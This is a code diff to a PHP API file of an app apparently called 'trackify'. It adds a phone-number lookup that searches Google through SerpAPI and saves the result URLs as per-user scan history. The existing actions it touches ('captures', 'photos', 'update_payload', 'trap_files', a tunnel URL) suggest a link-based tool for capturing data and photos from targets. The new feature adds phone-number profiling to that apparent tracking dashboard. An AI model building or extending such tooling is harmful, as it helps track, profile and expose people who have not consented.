@@ -7,7 +7,7 @@
 declare(strict_types=1);
 
 $action = $_GET['action'] ?? '';
-$authActions = ['start', 'stop', 'link', 'captures', 'photos', 'delete_photos', 'clear_captures', 'status', 'terminal', 'telegram', 'update_payload', 'diag'];
+$authActions = ['start', 'stop', 'link', 'captures', 'photos', 'delete_photos', 'clear_captures', 'status', 'terminal', 'telegram', 'update_payload', 'diag', 'phone_lookup', 'phone_history'];
 
 if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
     header('Content-Type: application/json');
@@ -76,6 +76,12 @@ switch ($action) {
     case 'diag':
         handleDiag();
         break;
+    case 'phone_lookup':
+        handlePhoneLookup();
+        break;
+    case 'phone_history':
+        handlePhoneHistory();
+        break;
     default:
         echo json_encode(['status' => 'error', 'message' => 'Unknown action']);
 }
@@ -135,6 +141,28 @@ function tunnel_origin_url(): string
         }
     }
     return 'http://127.0.0.1:8000';
+}
+
+/**
+ * Resolve SerpAPI key from config.php or environment.
+ *
+ * @return string|null non-empty when configured
+ */
+function serpapi_api_key(): ?string
+{
+    $path = __DIR__ . '/config.php';
+    if (is_readable($path)) {
+        $cfg = require $path;
+        if (!empty($cfg['serpapi_key']) && is_string($cfg['serpapi_key'])) {
+            return trim($cfg['serpapi_key']) ?: null;
+        }
+    }
+    $env = getenv('SERPAPI_API_KEY');
+    if (is_string($env) && trim($env) !== '') {
+        return trim($env);
+    }
+
+    return null;
 }
 
 /** @return non-empty-string|null */
@@ -557,6 +585,147 @@ function handleDiag(): void
         'config_owned' => config_owned_by_session($config),
         'trap_files' => $traps,
         'index_php_snippet' => $indexHead,
+    ]);
+}
+
+function handlePhoneLookup(): void
+{
+    $uid = dashboard_session_user_id();
+    $number = trim((string)($_GET['number'] ?? ''));
+    if ($number === '') {
+        echo json_encode(['status' => 'error', 'message' => 'number required']);
+        return;
+    }
+
+    $apiKey = serpapi_api_key();
+    if ($apiKey === null) {
+        echo json_encode([
+            'status' => 'error',
+            'message' => 'SerpAPI key not configured. Set serpapi_key in config.php or SERPAPI_API_KEY env.',
+        ]);
+        return;
+    }
+
+    $query = '"' . $number . '"';
+    $params = [
+        'engine' => 'google',
+        'q' => $query,
+        'num' => 10,
+        'api_key' => $apiKey,
+    ];
+
+    $url = 'https://serpapi.com/search?' . http_build_query($params);
+
+    $ctx = stream_context_create([
+        'http' => [
+            'method' => 'GET',
+            'timeout' => 10,
+            'ignore_errors' => true,
+        ],
+        'ssl' => [
+            'verify_peer' => true,
+            'verify_peer_name' => true,
+        ],
+    ]);
+
+    $raw = @file_get_contents($url, false, $ctx);
+    if ($raw === false) {
+        echo json_encode(['status' => 'error', 'message' => 'Search request failed']);
+        return;
+    }
+
+    $json = json_decode($raw, true);
+    if (!is_array($json)) {
+        echo json_encode(['status' => 'error', 'message' => 'Invalid search response']);
+        return;
+    }
+
+    // Extract URLs from organic_results
+    $urls = [];
+    if (!empty($json['organic_results']) && is_array($json['organic_results'])) {
+        foreach ($json['organic_results'] as $res) {
+            if (!empty($res['link']) && is_string($res['link'])) {
+                $urls[] = $res['link'];
+            }
+        }
+    }
+
+    // Save scan history if DB is available
+    $saved = false;
+    if ($uid > 0) {
+        $pdo = trackify_pdo();
+        if ($pdo instanceof PDO) {
+            try {
+                $stmt = $pdo->prepare('
+                    INSERT INTO phone_scan_history (user_id, phone_number, url_count, urls_json, created_at)
+                    VALUES (?, ?, ?, ?, NOW())
+                ');
+                $stmt->execute([$uid, $number, count($urls), json_encode($urls)]);
+                $saved = true;
+            } catch (Throwable $e) {
+                $saved = false;
+            }
+        }
+    }
+
+    echo json_encode([
+        'status' => 'success',
+        'number' => $number,
+        'urls' => $urls,
+        'saved' => $saved,
+    ]);
+}
+
+function handlePhoneHistory(): void
+{
+    $uid = dashboard_session_user_id();
+    if ($uid <= 0) {
+        echo json_encode(['status' => 'error', 'message' => 'Authentication required']);
+        return;
+    }
+
+    $pdo = trackify_pdo();
+    if (!$pdo instanceof PDO) {
+        echo json_encode(['status' => 'error', 'message' => 'Database not available']);
+        return;
+    }
+
+    try {
+        $stmt = $pdo->prepare('
+            SELECT id, phone_number, url_count, urls_json, created_at
+            FROM phone_scan_history
+            WHERE user_id = ?
+            ORDER BY created_at DESC
+            LIMIT 20
+        ');
+        $stmt->execute([$uid]);
+        $rows = $stmt->fetchAll();
+    } catch (Throwable $e) {
+        echo json_encode(['status' => 'error', 'message' => 'Could not load history']);
+        return;
+    }
+
+    $history = [];
+    foreach ($rows as $row) {
+        $urls = [];
+        if (!empty($row['urls_json'])) {
+            $decoded = json_decode($row['urls_json'], true);
+            if (is_array($decoded)) {
+                $urls = $decoded;
+            }
+        }
+        $history[] = [
+            'id' => (int) $row['id'],
+            'phone_number' => (string) $row['phone_number'],
+            'url_count' => (int) $row['url_count'],
+            'urls' => $urls,
+            'created_at' => (string) $row['created_at'],
+        ];
+    }
+
+    echo json_encode([
+        'status' => 'success',
+        'history' => $history,
     ]);
 }
 
